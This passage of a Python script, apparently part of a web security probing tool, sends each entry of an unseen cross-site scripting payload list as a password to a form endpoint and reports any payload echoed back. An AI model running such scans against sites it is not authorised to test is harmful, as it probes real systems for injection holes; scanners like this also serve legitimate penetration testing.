]

for payload in xss_payloads:
    form_data = {'username': 'test', 'password': payload, 'user_id': '10032'}
    r = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), headers=headers)
    if payload in r.text:
        print(f"[XSS] Payload reflected: {payload[:30]}")

print("\n[ALTERNATIVE VECTORS COMPLETE]")

